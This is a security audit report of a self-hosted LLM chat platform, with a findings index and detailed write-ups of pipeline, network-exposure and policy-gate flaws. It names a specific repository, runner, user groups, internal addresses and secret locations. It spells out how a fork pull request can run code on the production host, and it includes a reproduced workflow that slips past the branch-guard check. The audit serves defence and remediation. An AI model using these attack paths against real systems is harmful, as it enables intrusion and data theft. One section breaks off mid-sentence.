# Platform audit — findings, verdicts and disposition

Two passes. Pass one: eight readers mapped every first-party subsystem and
reported 82 defects (`review-manifest.md` lists the 300 files they read).
Pass two: eight independent skeptics re-read the code with instructions to
**refute** each claim, corrected its severity, and looked for what pass one
missed — finding 29 more. Nothing below is a guess: each row cites the code,
and where the two passes disagreed the verification text says which is right.

Severity after verification: P0 2, P1 20, P2 66, P3 20, none 3.
Verdicts on the 82 first-pass claims: CONFIRMED 36, ADJUSTED 46, REFUTED 0.

`ADJUSTED` means the code is as described but the severity, the reach or the
mechanism was wrong — the corrected version is what this table carries.

## Index

| id | sev | area | finding | verdict |
|---|---|---|---|---|
| F064 | P0 | cicd | A fork pull request can execute arbitrary code on the production DGX as a sudo+docker user | CONFIRMED |
| F050 | P0 | edge-devops | The main model's raw OpenAI API is unauthenticated and reachable from the office LAN, the tailn | CONFIRMED |
| F065 | P1 | cicd | The raw, unauthenticated vLLM OpenAI API is bound to 0.0.0.0:8000 and the verify gate is blind  | ADJUSTED |
| F066 | P1 | cicd | workflow_policy P4 accepts an INVERTED branch guard, so a self-hosted job restricted to "every  | CONFIRMED |
| F067 | P1 | cicd | The whole gate architecture assumes branch protection that does not exist; `CI passed` is not a | CONFIRMED |
| N021 | P1 | cicd | P4 is skipped entirely when `runs-on` is an expression: a matrix can smuggle `self-hosted` past | FOUND IN VERIFICATION |
| F034 | P1 | database | Bare /chat calls write private document and page text under a conversation key any other user c | ADJUSTED |
| N010 | P1 | database | GET /chat/salesforce/{id} and POST /chat/salesforce/cancel fail OPEN on unowned ids, and the ba | FOUND IN VERIFICATION |
| F051 | P1 | edge-devops | The worker node's OCR and speech engines answer unauthenticated on the office LAN | ADJUSTED |
| F052 | P1 | edge-devops | Portainer is published on 0.0.0.0:9000 (and IPv6) with the Docker socket mounted — host-root-eq | CONFIRMED |
| N017 | P1 | edge-devops | The unauthenticated model APIs sit on the same Docker network as the Cloudflare tunnel, so one  | FOUND IN VERIFICATION |
| F042 | P1 | inference-model-registry | The raw vLLM OpenAI endpoint listens on every host interface with no authentication | ADJUSTED |
| F043 | P1 | inference-model-registry | The OCR model engine on the worker node is reachable unauthenticated on the LAN | CONFIRMED |
| F044 | P1 | inference-model-registry | A non-streaming LONG-lane request keeps the NORMAL lane closed for the whole generation, and NO | ADJUSTED |
| F045 | P1 | inference-model-registry | json_completion and chat_completion_with_reasoning never record token usage, so usage_events un | CONFIRMED |
| N013 | P1 | inference-model-registry | A crafted non-Latin prompt bypasses the LONG admission lane entirely, because admission re-esti | FOUND IN VERIFICATION |
| F012 | P1 | orchestrator-core | The raw vLLM model API is listening on 0.0.0.0:8000 with no authentication — /v1 on this host i | ADJUSTED |
| F015 | P1 | orchestrator-core | A 422 on POST /chat echoes the ENTIRE request body back to an unauthenticated caller | CONFIRMED |
| F016 | P1 | orchestrator-core | No request body size limit anywhere on the orchestrator; an unauthenticated caller's body is fu | ADJUSTED |
| F017 | P1 | orchestrator-core | LiveGeneration.events grows without bound — every SSE frame of every in-flight generation is re | CONFIRMED |
| F018 | P1 | orchestrator-core | No rate limit, quota or concurrency cap per identity on /chat — one principal can occupy all 10 | ADJUSTED |
| N004 | P1 | orchestrator-core | The bare-API conversation key `u<user_id>-<session_id>` shares a namespace with user-chosen con | FOUND IN VERIFICATION |
| F076 | P2 | admin-usage | The orchestrator serves an unauthenticated OpenAPI schema and Swagger UI (/openapi.json, /docs) | ADJUSTED |
| F077 | P2 | admin-usage | Nav links to /admin/analytics/models, a page that does not exist - the Models board lives on th | CONFIRMED |
| F078 | P2 | admin-usage | The per-member usage table and its CSV export are gated on WORKSPACE_READ (an ordinary admin ca | ADJUSTED |
| F079 | P2 | admin-usage | The two audited admin download routes record a blank user_agent and the proxy container's IP, b | CONFIRMED |
| F080 | P2 | admin-usage | The audit log API returns each event's meta jsonb but the page has no column for it, so role ch | CONFIRMED |
| F081 | P2 | admin-usage | The edge auth middleware never runs for any path beginning with the letters "api", so the plann | ADJUSTED |
| F082 | P2 | admin-usage | proxyToOrchestrator buffers whole request and response bodies and drops the Authorization heade | ADJUSTED |
| N027 | P2 | admin-usage | The admin usage CSV export writes attacker-controlled display names and emails unescaped, while | FOUND IN VERIFICATION |
| N028 | P2 | admin-usage | Every proxied POST/PUT body is buffered whole into the Next process before any authentication,  | FOUND IN VERIFICATION |
| N029 | P2 | admin-usage | The only request throttle in the system is keyed to login email — there is no per-principal or  | FOUND IN VERIFICATION |
| F026 | P2 | authn-authz | FastAPI /docs, /redoc and /openapi.json are unauthenticated on an 0.0.0.0-bound port and publis | ADJUSTED |
| F027 | P2 | authn-authz | AUTH_TRUST_PROXY_HEADERS=true plus a directly reachable orchestrator makes X-Forwarded-For atta | ADJUSTED |
| F028 | P2 | authn-authz | Invitation-claim account takeover: an ADMIN can seize any disabled or removed account — includi | ADJUSTED |
| F029 | P2 | authn-authz | An ADMIN can read a SUPER_ADMIN's (and a peer admin's) conversations, uploads and reports — the | CONFIRMED |
| F033 | P2 | authn-authz | No request-body size limit anywhere: PUT /auth/preferences validates size only after the whole  | ADJUSTED |
| N006 | P2 | authn-authz | An ADMIN can read per-person usage analytics through Cap.WORKSPACE_READ, contradicting ANALYTIC | FOUND IN VERIFICATION |
| N008 | P2 | authn-authz | In-process SessionMemory is an unbounded dict keyed by an unvalidated client-supplied session_i | FOUND IN VERIFICATION |
| F068 | P2 | cicd | The verify step named "A rolling deploy did not restart the main model" asserts nothing and can | CONFIRMED |
| F069 | P2 | cicd | The deploy summary's `tail -40 .runtime/logs/deploy-*.log` has never worked: GNU tail rejects t | CONFIRMED |
| F071 | P2 | cicd | The pip-audit step can never report a non-success outcome, so the supply-chain summary table al | CONFIRMED |
| F074 | P2 | cicd | There is no rollback path in the pipeline, and the rollback script that exists is called by not | CONFIRMED |
| F075 | P2 | cicd | DEPLOY_BRANCH is documented as a live repository variable but the pipeline stopped reading it;  | CONFIRMED |
| N022 | P2 | cicd | P5 only checks that a job DECLARES permissions, never what it declares — a job can grant itself | FOUND IN VERIFICATION |
| N023 | P2 | cicd | No CI gate can ever see a newly published 0.0.0.0 port: the blocking trivy pass excludes miscon | FOUND IN VERIFICATION |
| F035 | P2 | database | cancel_parked_chat_requests has no owner predicate and can cancel another user's queued generat | ADJUSTED |
| F036 | P2 | database | workspace_id is denormalised text with no foreign key on every table a billing or quota query w | ADJUSTED |
| F037 | P2 | database | One-membership-per-user resolution blocks a multi-tenant API: Principal silently picks the olde | ADJUSTED |
| F038 | P2 | database | Migration DDL runs under a 15 s statement_timeout inside one all-or-nothing transaction, so a V | CONFIRMED |
| F039 | P2 | database | V29 and V30 do not index the user_id foreign keys their cascades walk, against the rule V31 sta | ADJUSTED |
| F040 | P2 | database | No retention or pruning exists for the four append-only tables a public API will grow fastest | CONFIRMED |
| F041 | P2 | database | Test isolation depends on a hand-maintained table list, so a V34 table leaks state between test | ADJUSTED |
| N011 | P2 | database | chat_requests.intent_id is one global primary-key namespace across all users, so a client-chose | FOUND IN VERIFICATION |
| N012 | P2 | database | web_pages is a single global corpus with no tenant predicate on retrieval — one API caller can  | FOUND IN VERIFICATION |
| F053 | P2 | edge-devops | The orchestrator publishes on 0.0.0.0:8080 and serves FastAPI's /docs, /redoc and /openapi.json | ADJUSTED |
| F054 | P2 | edge-devops | The orchestrator container carries every secret in the project, including the Cloudflare tunnel | ADJUSTED |
| F055 | P2 | edge-devops | The engine controller's state and metrics API is on 0.0.0.0:9838 with no authentication | ADJUSTED |
| F056 | P2 | edge-devops | node_exporter publishes full host telemetry on 0.0.0.0:9100 with no firewall behind it | ADJUSTED |
| F057 | P2 | edge-devops | cadvisor receives the Docker socket through a read-only bind of /var/run, which does not make t | ADJUSTED |
| F058 | P2 | edge-devops | AUTH_TRUST_PROXY_HEADERS is on while the orchestrator is directly reachable on 0.0.0.0:8080, so | ADJUSTED |
| F059 | P2 | edge-devops | The public tunnel's ingress is not in version control — the public routing exists only in the C | CONFIRMED |
| F060 | P2 | edge-devops | Grafana's session cookie is issued without the Secure flag on a public HTTPS hostname | CONFIRMED |
| F061 | P2 | edge-devops | SearXNG falls back to a hard-coded secret when the generated env is absent | CONFIRMED |
| F062 | P2 | edge-devops | An unmanaged container is holding the application data volume open | CONFIRMED |
| F063 | P2 | edge-devops | The cluster's torch-distributed master port and an iperf3 server listen on all interfaces | ADJUSTED |
| N018 | P2 | edge-devops | A second unmanaged container, litellm-dgx, is already an OpenAI gateway in front of the main mo | FOUND IN VERIFICATION |
| N019 | P2 | edge-devops | The public login page and the login API are served over plaintext HTTP with no HSTS | FOUND IN VERIFICATION |
| N020 | P2 | edge-devops | The whole application is published on 0.0.0.0:3000, so every Cloudflare edge control is one hop | FOUND IN VERIFICATION |
| F001 | P2 | frontend-app | Request bodies are buffered whole in the Next process before any authentication, with no size l | ADJUSTED |
| F002 | P2 | frontend-app | The BFF launders a client-supplied Cf-Connecting-IP into a trusted X-Forwarded-For, forging aud | ADJUSTED |
| F004 | P2 | frontend-app | The page gate will 307 the planned /v1 API and /docs pages to /login | CONFIRMED |
| N002 | P2 | frontend-app | No Next proxy forwards Authorization, so an API-key credential cannot cross the BFF at all | FOUND IN VERIFICATION |
| F046 | P2 | inference-model-registry | Image and other multimodal prompts are sized as text-only, so a large image prefill never reach | ADJUSTED |
| F047 | P2 | inference-model-registry | The engine controller's /state document is served unauthenticated on every host interface | ADJUSTED |
| F048 | P2 | inference-model-registry | The AsyncOpenAI client cache is cleared without closing the clients, leaking httpx connection p | ADJUSTED |
| F049 | P2 | inference-model-registry | Module and function docs still describe gpt-oss-120b and a 131072 window, which the /docs build | ADJUSTED |
| N014 | P2 | inference-model-registry | One user-triggerable 400 on any streaming call permanently disables token telemetry for the who | FOUND IN VERIFICATION |
| N015 | P2 | inference-model-registry | The orchestrator's /health and /metrics are unauthenticated on 0.0.0.0:8080 and publish live ad | FOUND IN VERIFICATION |
| N016 | P2 | inference-model-registry | User-submitted OCR images cross the office LAN in cleartext because OCR_BASE_URL points at the  | FOUND IN VERIFICATION |
| F013 | P2 | orchestrator-core | /docs, /redoc and /openapi.json are enabled and unauthenticated on a 0.0.0.0-published port, di | ADJUSTED |
| F014 | P2 | orchestrator-core | GET /health is unauthenticated and returns internal hostnames, container paths, engine capacity | ADJUSTED |
| F019 | P2 | orchestrator-core | BUILD BLOCKER — the app-wide CSRF middleware and the 3-origin CORS allowlist will break every b | ADJUSTED |
| F020 | P2 | orchestrator-core | BUILD BLOCKER — the generation registry is one-per-conversation-key and the second concurrent r | ADJUSTED |
| F021 | P2 | orchestrator-core | The CSRF 403 is emitted outside CORSMiddleware, so browsers see an opaque CORS error instead of | CONFIRMED |
| F022 | P2 | orchestrator-core | GET /chat/trace/{trace_id} returns sanitized exception text that can carry an internal hostname | ADJUSTED |
| F023 | P2 | orchestrator-core | No response carries a request id; the correlation id exists but never leaves via a header, and  | CONFIRMED |
| N005 | P2 | orchestrator-core | `session_id` is the only client-supplied identifier on ChatRequest with no validation — unbound | FOUND IN VERIFICATION |
| F030 | P3 | authn-authz | The cross-site-write middleware is inert for all real browser traffic and has no Referer/Sec-Fe | ADJUSTED |
| F031 | P3 | authn-authz | Production CORS allowlist still contains http://localhost:3000 and http://127.0.0.1:3000 with a | ADJUSTED |
| N007 | P3 | authn-authz | GET /admin/api/members/{user_id}/sessions has no outranks guard - an admin can list a super adm | FOUND IN VERIFICATION |
| N009 | P3 | authn-authz | chat_requests shares one conversation_id namespace between owner-checked ids and synthetic per- | FOUND IN VERIFICATION |
| F070 | P3 | cicd | The `launcher (3.11)` matrix leg reports success when it discovers zero tests | CONFIRMED |
| F072 | P3 | cicd | Eight of twelve jobs declare no `timeout-minutes` and inherit the 6-hour default | CONFIRMED |
| F073 | P3 | cicd | The recovery job publishes the full unauthenticated /health payload into a public repository's  | CONFIRMED |
| N024 | P3 | cicd | pip-audit never scans the orchestrator's production dependency set | FOUND IN VERIFICATION |
| N025 | P3 | cicd | The engine controller binds 0.0.0.0 by default and serves /state unauthenticated on the LAN | FOUND IN VERIFICATION |
| N026 | P3 | cicd | AUTH_TRUST_PROXY_HEADERS=true while the orchestrator port is LAN-reachable, so the audit trail' | FOUND IN VERIFICATION |
| F003 | P3 | frontend-app | The middleware matcher has a hole at exactly `/api` — a console page there would render for sig | ADJUSTED |
| F005 | P3 | frontend-app | proxyToOrchestrator discards every response header except content-type — Retry-After and rate-l | CONFIRMED |
| F006 | P3 | frontend-app | proxyToOrchestrator sends no abort signal, so a closed tab leaves the upstream request running  | ADJUSTED |
| F007 | P3 | frontend-app | MOCK_MODE is a complete authentication bypass reachable through a single environment variable | ADJUSTED |
| F008 | P3 | frontend-app | The admin nav links to /admin/analytics/models, which has no page | CONFIRMED |
| F009 | P3 | frontend-app | The BFF strips Origin, disabling the orchestrator's CSRF second layer for all browser writes | CONFIRMED |
| F010 | P3 | frontend-app | proxyToOrchestrator round-trips request bodies through a UTF-8 string, corrupting any binary pa | CONFIRMED |
| F011 | P3 | frontend-app | Two route-handler comments assert an auth posture the orchestrator no longer has | CONFIRMED |
| N001 | P3 | frontend-app | The matcher's dot rule excludes any path with a dot in ANY segment, while authRedirect only ins | FOUND IN VERIFICATION |
| N003 | P3 | frontend-app | There is no rate limiting anywhere in the frontend BFF, and the login throttle is the only rate | FOUND IN VERIFICATION |
| F032 | none | authn-authz | The edge middleware never runs for the literal path /api — the planned developer console page a | ADJUSTED |
| F024 | none | orchestrator-core | No route declares a response_model, so the generated OpenAPI describes no response shapes at al | CONFIRMED |
| F025 | none | orchestrator-core | Single uvicorn worker with all request lifecycle state in process memory — the /v1 surface cann | ADJUSTED |

## Detail

### F064 — A fork pull request can execute arbitrary code on the production DGX as a sudo+docker user

**P0** · cicd · `.github/workflows/pipeline.yml:72` · verdict **CONFIRMED** · blocks release

*Evidence.* pipeline.yml:71-73 `on:\n  pull_request:\n  push:` — the `pull_request` trigger has no branch or path filter. For a `pull_request` event GitHub executes the workflow file from the PR's own merge ref, so every guard in this file is editable in the same commit that triggers the run: the deploy job's `if:` (pipeline.yml:755-763), the `runs-on: [self-hosted, dgx-spark]` restriction, and the `policy` job that runs workflow_policy.py (pipeline.yml:106-149). Verified environment: `gh api repos/namanjain221995/personal-LLM-Chabot` => `"visibility":"public"`, `"forks":0`; `gh api .../actions/runners` => one runner `spark-0e68`, status `online`, labels [self-hosted, Linux, ARM64, dgx-spark]; `id techsphere` => `groups=...,27(sudo),...,988(docker)`; `getent group docker` => `docker:x:988:techsphere`. The only live control is `gh api repos/.../actions/permissions/fork-pr-contributor-approval` => `{"approval_policy":"first_time_contributors"}` — GitHub's default, under which only a contributor with no prior commit needs a maintainer click.

*Impact.* An outside contributor who has had one trivial PR merged (or whose first run a maintainer approves once) can open a follow-up PR that adds a job with `runs-on: [self-hosted, dgx-spark]` and no branch guard. That job runs on the production box as `techsphere`, which is in the `docker` group — root-equivalent. It can read `.env`, `.runtime/secrets.env`, the Postgres volume, the 41 GB model cache and the Cloudflare tunnel credentials, and it can destroy or exfiltrate all of it. workflow_policy.py cannot defend against this because it runs inside the same attacker-controlled workflow. This is the single worst outcome the file's own header (pipeline.yml:34-41) says it is defending against, and the defence is incomplete.

*Verification.* The orchestrator's calibration ("the only self-hosted jobs require github.ref == refs/heads/main") answers a DIFFERENT claim than this one. I read the committed guards and they do hold: pipeline.yml:755-763 (deploy), :935-937 (verify), :1027-1030 (recovery) each carry `github.ref == 'refs/heads/main'`, and `pull_request` never produces that ref. But F064's mechanism is that the workflow FILE itself comes from the PR head on a `pull_request` event, so the attacker supplies the job list, not this file. Environment re-verified by me: `gh api repos/namanjain221995/personal-LLM-Chabot` => {"forks":0,"private":false,"visibility":"public"}; `gh api .../actions/runners` => one runner `spark-0e68`, online, labels [self-hosted, Linux, ARM64, dgx-spark], repository-scoped, no runner group restriction; `gh api .../actions/permissions/fork-pr-contributor-approval` => {"approval_policy":"first_time_contributors"}; `id techsphere` => groups include 27(sudo),988(docker). `grep -n 'secrets\.' pipeline.yml` => no hits, so a fork PR gains no secrets from the token — but it does not need them: the job runs as techsphere on the box, where TECHSARA_DEPLOY_ROOT/.env (which I read: PGADMIN_DEFAULT_PASSWORD in cleartext at .env:67) and .runtime/secrets.env live. `gh api .../contributors` returns TWO logins: namanjain221995 (347) and Jayeshpra (1) — so there is already one account that is NOT a first-time contributor and whose fork-PR workflows therefore run with no approval click under the current policy.

*Exploitable today.* yes, with one of two preconditions: (a) the existing non-owner contributor account (Jayeshpra) — or any account that later lands one merged commit — opens a fork PR, and it runs with NO approval under approval_policy=first_time_contributors; or (b) a brand-new account's first PR gets one "Approve and run" click from a maintainer. No network position is needed; GitHub schedules the job onto spark-0e68 itself.

*Fix.* Smallest correct fix, no code change: Settings -> Actions -> General -> "Require approval for all external contributors" (i.e. PATCH .../actions/permissions/fork-pr-contributor-approval with approval_policy=all_external_contributors). That removes the returning-contributor exemption and is the only change that closes the no-click path. The durable fix is to move spark-0e68 out of this public repo (register it to a private deploy repo driven by repository_dispatch) and take techsphere out of the `docker` group in favour of a socket proxy.

*Fix risk.* The settings toggle is instant, affects no running process, and needs no container, model or production window. It costs a maintainer one click per external PR. Re-registering the runner elsewhere would need a runner-service restart (not a model restart) and a rewrite of the deploy trigger.

### F050 — The main model's raw OpenAI API is unauthenticated and reachable from the office LAN, the tailnet and both RoCE rails

**P0** · edge-devops · `compose/compose.published-dgx-spark.yaml:28` · verdict **CONFIRMED** · blocks release

*Evidence.* compose/compose.published-dgx-spark.yaml:28 publishes the MAIN engine at `${TECHSARA_BIND_ADDRESS:-127.0.0.1}:${VLLM_PORT:-8000}:30000` while lines 35, 42, 49 and 56 correctly use `${TECHSARA_MODEL_BIND_ADDRESS:-127.0.0.1}` for router/embed/ocr/reranker. In dual mode the same variable drives the host bind: launcher/techsara_cli/cluster.py:83 `DEFAULT_API_BIND_ADDRESS = "0.0.0.0"` and :867-868 `if publish_model_ports: api_bind = DEFAULT_API_BIND_ADDRESS`, which compose/compose.cluster-dgx-spark.yaml:33 (`network_mode: host`) and :40 (`--host ${CLUSTER_API_BIND_ADDRESS}`) put straight on the host. .env:72-73 are `TECHSARA_BIND_ADDRESS=0.0.0.0` and `PUBLISH_MODEL_PORTS=true`, .runtime/generated.env:22 is `CLUSTER_API_BIND_ADDRESS=0.0.0.0`. Observed: `ss -ltn` shows `LISTEN 0 2048 0.0.0.0:8000`, and `docker inspect sf-local-ai-vllm-1` shows `--host 0.0.0.0 --port 8000`.

*Impact.* Any host on 192.168.9.0/22, on the tailnet, or on the RoCE fabric can run unlimited, unauthenticated, unlogged inference on Qwen3.6-35B-A3B-NVFP4 with a 1,000,000-token context. That is free GPU capacity for an attacker, a denial of service against every logged-in employee (the engine is TP=2 across both Sparks, so saturating it starves chat), and a complete bypass of the login, the per-user feature gates, the audit log and the analytics that the whole enterprise-auth retrofit exists to enforce. It also bypasses every guardrail the orchestrator applies to prompts. There is no host firewall: compose/compose.monitoring.yaml:137-139 records "ufw is off on both nodes".

*Verification.* Every element re-checked and true. `docker inspect sf-local-ai-vllm-1` shows NetworkMode=host and Args containing `--host 0.0.0.0 --port 8000 ... --max-model-len 1000000`, with no `--api-key` anywhere in the argv. `ss -ltn` shows `LISTEN 0 2048 0.0.0.0:8000`. I re-ran the probe myself: GET http://192.168.9.54:8000/v1/models -> 200 (LAN), and the same port answers on the tailnet address and on both bridge gateways (172.17.0.1/172.18.0.1/172.19.0.1 -> 200). The cited source lines are accurate: compose/compose.published-dgx-spark.yaml:28 uses `${TECHSARA_BIND_ADDRESS:-127.0.0.1}` while :35,:42,:49,:56 use `${TECHSARA_MODEL_BIND_ADDRESS:-127.0.0.1}`; launcher/techsara_cli/cluster.py:83 `DEFAULT_API_BIND_ADDRESS = "0.0.0.0"` and :869-872 `if publish_model_ports: api_bind = DEFAULT_API_BIND_ADDRESS else: api_bind = detectors.docker_bridge_gateway() or DEFAULT_API_BIND_ADDRESS`; .env:72 `TECHSARA_BIND_ADDRESS=0.0.0.0`, .env:73 `PUBLISH_MODEL_PORTS=true`; .env.example:830-832 does scope the warning to "8002-8005", omitting 8000. TWO CORRECTIONS to the auditor. (a) The live path is NOT compose.published-dgx-spark.yaml:28 — compose/compose.cluster-dgx-spark.yaml:33-40 sets `network_mode: host` and `ports: !reset []`, so the published overlay's port mapping is discarded and the bind comes solely from `--host ${CLUSTER_API_BIND_ADDRESS}`. Editing line 28 alone changes nothing on this box; launcher/techsara_cli/cluster.py:869 is the load-bearing line. (b) Their proposed defence-in-depth `--api-key` would BREAK chat: orchestrator/app/llm.py:305 `LOCAL_API_KEY = "local-no-key"` and :383 `api_key=api_key or LOCAL_API_KEY`; grep finds zero reads of TECHSARA_MODEL_API_KEY anywhere under orchestrator/ (the variable is in the container env but no code consumes it).

*Exploitable today.* Yes. Precondition is only a network position on 192.168.9.0/22, the tailnet, or either RoCE rail — no credential, no session, no user account. Not reachable from the public internet (the tunnel's only ingress is ai.techsarasolutions.com -> http://frontend:3000).

*Fix.* Smallest correct fix: in launcher/techsara_cli/cluster.py:869 drop the `publish_model_ports` special case so `api_bind = detectors.docker_bridge_gateway() or "127.0.0.1"` in both branches — the docker-bridge-gateway path already exists in the else-branch and is exactly what the orchestrator/sync-worker already dial (`extra_hosts: vllm:host-gateway` at compose/compose.cluster-dgx-spark.yaml:152-157) and what the engine-controller dials (HEAD_API_URL default at compose/compose.cluster-dgx-spark.yaml:148). Then `./techsara redetect`/`up` to rewrite .runtime/generated.env:CLUSTER_API_BIND_ADDRESS. Also fix compose/compose.published-dgx-spark.yaml:28 to TECHSARA_MODEL_BIND_ADDRESS for the single-node path, and correct .env.example:830-832 to say 8000-8005. Do NOT add --api-key without first teaching orchestrator/app/llm.py to send it.

*Fix risk.* Needs a MAIN MODEL RESTART — changing the engine's --host recreates sf-local-ai-vllm-1 and both TP ranks, i.e. a production window and a cold start (the availability notes budget 900 s, ENGINE_COLD_START_BUDGET_S). Regression risk: anything that dials 8000 on the LAN address breaks — confirmed dependants are the unmanaged litellm-dgx container (api_base http://host.docker.internal:8000/v1) and the interview-analysis second tenant on the worker, which per MEMORY hits the raw vLLM port over the RoCE address; if that tenant uses 10.100.184.1:8000 it will break, so bind to the bridge gateway AND k

### F065 — The raw, unauthenticated vLLM OpenAI API is bound to 0.0.0.0:8000 and the verify gate is blind to the bind interface

**P1** · cicd · `.github/workflows/pipeline.yml:968` · verdict **ADJUSTED** · claimed P0 · blocks release

*Evidence.* pipeline.yml:968 `check "main model /v1/models"  "http://127.0.0.1:8000/v1/models"    200 9` and pipeline.yml:977-986 read `VLLM_PORT` from `.runtime/generated.env` and curl `http://127.0.0.1:${port}/v1/chat/completions` — every probe is against loopback, so the check passes identically whether the engine binds 127.0.0.1 or 0.0.0.0. Actual state: `ss -lntp` => `LISTEN 0 2048 0.0.0.0:8000`, `LISTEN 0 4096 0.0.0.0:8080`, `LISTEN 0 4096 0.0.0.0:3000`. Reachability on the host's LAN address confirmed: `curl -o /dev/null -w '%{http_code}' http://192.168.9.54:8000/v1/models` => `200`, and `http://192.168.9.54:8080/health` => `200`.

*Impact.* The model engine's OpenAI-compatible API — no auth, no quota, no logging tied to a user — answers on every interface of the box. Anyone on the LAN can run unlimited generation on the 35B model, saturating both Sparks and starving live chat, and can read the served model id and context configuration. This is precisely the endpoint the developer-platform build intends to sell access to behind `/v1/responses` with API keys and scopes; shipping that product on top of an already-open raw port makes the key system decorative. The pipeline is complicit rather than causal: `verify` is the one automated gate that touches this port after every deploy and it can never notice.

*Verification.* Both halves are factually right, and the exposure is worse than the repo's own comment claims — but it is LAN/tailnet, not internet, so P0 overstates it. Verified: `ss -ltnp` => LISTEN 0.0.0.0:8000; `curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8000/v1/models` => 200 with no credential; docker-compose.yml:144 publishes `- "8000:30000"` with no host_ip and the engine command is `--host 0.0.0.0` (docker-compose.yml:122); no --api-key anywhere (`grep -rn 'api-key\|VLLM_API_KEY' docker-compose*.yml` => no hits). The bind is a deliberate, documented opt-in: /home/techsphere/.../.env:72-73 sets TECHSARA_BIND_ADDRESS=0.0.0.0 and PUBLISH_MODEL_PORTS=true. The sharper point the finding misses: .env:327-329 says "Unauthenticated model APIs stay on loopback" and pins TECHSARA_MODEL_BIND_ADDRESS=127.0.0.1 — but that variable governs 8002-8005 only (launcher/tests/test_compose_overlays.py:890-913 asserts exactly that), so the ONE unauthenticated model API left on 0.0.0.0 is the 35B main engine, the most expensive one. The CI half is confirmed verbatim: pipeline.yml:968 and :977-986 probe only 127.0.0.1, so `verify` passes identically whether the engine binds loopback or 0.0.0.0.

*Exploitable today.* yes for anyone with a LAN or tailnet position on this box — unlimited unauthenticated generation on the 35B pair, plus disclosure of the served model id and context config. NOT reachable from the internet: the Cloudflare tunnel only fronts the frontend, so no unauthenticated remote attacker can reach :8000.

*Fix.* Two lines. (1) In /home/techsphere/Documents/project/personal-LLM-Chabot/.env set PUBLISH_MODEL_PORTS=false, or add an explicit host_ip for the main port so :8000 follows TECHSARA_MODEL_BIND_ADDRESS like 8002-8005 already do — the orchestrator reaches the engine over the compose network, not the published port. (2) In pipeline.yml's `verify` job add an assertion next to the :968 probe: `ss -lntH "sport = :${port}" | awk '{print $4}'` must start with 127.0.0.1 or the RoCE address, else fail.

*Fix risk.* Changing PUBLISH_MODEL_PORTS re-renders compose and recreates the `vllm` service — that IS a main-model reload (15-25 min) and needs a production window, so do it during a scheduled --full deploy, not casually. Check first that nothing off-box (the interview-analysis pipeline on the worker hits the raw vLLM port over the RoCE address) depends on the 0.0.0.0 binding; binding to the cluster address rather than loopback is the safe middle. The pipeline.yml assertion alone is free and needs no restart.

### F066 — workflow_policy P4 accepts an INVERTED branch guard, so a self-hosted job restricted to "every branch except main" passes the gate

**P1** · cicd · `.github/workflows/scripts/workflow_policy.py:186` · verdict **CONFIRMED** · blocks release

*Evidence.* The check is a substring test: `if f"refs/heads/{default_branch}" not in cond:` (workflow_policy.py:186). The only guard against an inversion is at line 184, `if pr_triggered and "pull_request" in cond and "!=" not in cond:` — it requires the literal string `pull_request` to appear in the condition before it looks at `!=`. So `if: github.ref != 'refs/heads/main'` satisfies P4 completely. Reproduced: a one-job workflow with `on: [pull_request, push]`, `runs-on: [self-hosted, dgx-spark]`, `permissions: {contents: read}` and `if: github.ref != 'refs/heads/main'` produced `checked 1 workflow file(s): evil.yml` / `workflow policy: OK (P1-P6)` / `EXIT=0`. On a pull_request event `github.ref` is `refs/pull/N/merge`, which is `!= 'refs/heads/main'`, so the condition is TRUE and the job dispatches to the DGX.

*Impact.* The single mechanical defence the pipeline header (pipeline.yml:34-41) names as non-negotiable — "no pull_request-triggered job may ever land on [self-hosted, dgx-spark]" — can be satisfied by a condition that means the exact opposite. A reviewer skimming a diff sees `refs/heads/main` in the `if:` and the gate says OK. Combined with the fork-PR exposure above it turns a two-character typo (or a deliberate one-character edit) into production code execution with no red build.

*Verification.* Read and reproduced. workflow_policy.py:186 is a substring test: `if f"refs/heads/{default_branch}" not in cond:`, and the only inversion guard at :184 is `if pr_triggered and "pull_request" in cond and "!=" not in cond:` — it never looks at `!=` unless the literal word `pull_request` is in the condition. I wrote the exact evil.yml (on: [pull_request, push]; runs-on: [self-hosted, dgx-spark]; permissions: {contents: read}; if: github.ref != 'refs/heads/main') and ran `python3 .github/workflows/scripts/workflow_policy.py --dir . --default-branch main` => "checked 1 workflow file(s): evil.yml / workflow policy: OK (P1-P6) / EXIT=0". On a pull_request event github.ref is refs/pull/N/merge, so that condition is TRUE and the job dispatches to the DGX.

*Exploitable today.* yes as a gate bypass, but it only converts into execution through F064's path (a fork PR, or a collaborator push to dev) — and an attacker taking that path does not need the inversion trick at all, since they can delete the policy job outright. Its real bite is the reviewer-deception case: a one-character edit that a diff reader and a green `policy` job both bless.

*Fix.* In check_file, for any job whose _runs_on_text contains self-hosted: fail unconditionally on `re.search(r"github\\.ref\\s*!=", cond)` regardless of whether `pull_request` appears, and require a positive `re.search(r"github\\.ref\\s*==\\s*'refs/heads/" + default_branch + "'", cond)` instead of the substring test at :186. Add evil.yml as a unit test.

*Fix risk.* Pure static-analysis change in a hosted-runner job; no container, model or production window. Verify the real pipeline.yml still passes after the change (its three self-hosted `if:` blocks do contain `github.ref == 'refs/heads/main'`, so it will).

### F067 — The whole gate architecture assumes branch protection that does not exist; `CI passed` is not a required check and nothing blocks a merge

**P1** · cicd · `.github/workflows/pipeline.yml:181` · verdict **CONFIRMED** · blocks release

*Evidence.* pipeline.yml:181-182 states "names below are load-bearing: branch protection and every saved PR filter reference them. Do not rename." pipeline.yml:645-647 states "One required check to protect main with, instead of eleven. The NAME is load-bearing — branch protection references it". ci_gate.py's entire docstring (lines 4-27) is written around "GitHub branch protection treats a skipped required check as satisfied". Actual state: `gh api repos/namanjain221995/personal-LLM-Chabot/branches/main/protection` => `{"message":"Branch not protected","status":"404"}`; `gh api repos/.../rulesets` => `[]`; `gh api repos/.../environments` => production with `"protection_rules": []` and `"deployment_branch_policy": null`.

*Impact.* A PR can be merged into main with `CI passed` red, or with the pipeline never having run. The only thing that then stops a bad deploy is the deploy job's own `needs.ci-ok.result == 'success'` (pipeline.yml:756) — which protects the box but not the branch, so main can carry code no suite ever accepted and the next unrelated green push deploys it. The `production` environment is declared (pipeline.yml:769) purely for its approval-gate potential, and that potential is unconfigured, so every push to main deploys unattended. For the developer-platform build this is load-bearing in the other direction too: it is the reason the emoji rename is currently free, and it is a trap if protection is enabled between writing the rename and merging it.

